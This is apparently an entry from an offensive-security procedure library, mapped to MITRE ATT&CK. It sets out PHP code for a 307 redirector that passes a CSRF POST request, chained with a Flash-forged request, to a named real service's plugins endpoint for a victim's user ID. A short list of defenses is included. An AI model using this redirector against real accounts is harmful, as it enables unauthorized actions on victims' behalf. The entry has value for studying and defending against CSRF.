---
tags:
  - php
  - redirect
  - '307'
  - web
type: procedure
tools:
  - '[[tools/PHP-Redirector-Script]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:36.190Z'
sub_techniques: []
id: 83fedfc6-2c51-4d1f-a35a-ffeda35ea8b4
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Configure PHP 307 Redirector

## Summary

Set up a PHP script to perform a 307 Temporary Redirect to the target endpoint, preserving the POST method and body for the CSRF payload.

## Description

The 307 status code ensures the request method (POST) is maintained during redirect, crucial for CSRF. The script is hosted on a free platform like 000webhost and points to the vulnerable plugins endpoint with the user's ID.

## Requirements

1. PHP hosting (e.g., 000webhostapp.com)
2. Knowledge of target URL structure
3. Victim's user ID ($userid$)

## Defense

Defensive measures and detection strategies:

- Validate referer headers
- Implement CSRF tokens
- Log and alert on suspicious redirects

## Objectives

1. Preserve request details in redirect
2. Chain with Flash-forged request
3. Deliver payload to endpoint

## Instructions

### Step 1: Create stripo.php

**Context**: Script issues 307 to target.

```php
<?php
header('Location: https://my.stripo.email/cabinet/stripeapi/v1/plugin/' . $_GET['userid'] . '/plugins', true, 307);
exit;
?>
```

> Upload to https://testingsubdomain.000webhostapp.com/stripo.php.

### Step 2: Test Redirect

**Context**: Verify 307 behavior.

Visit https://testingsubdomain.000webhostapp.com/stripo.php?userid=123 with POST data.

> Expected: Redirects to endpoint, preserves POST.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/PHP-Redirector-Script]]

## Tags

- [[php]]
- [[redirect]]
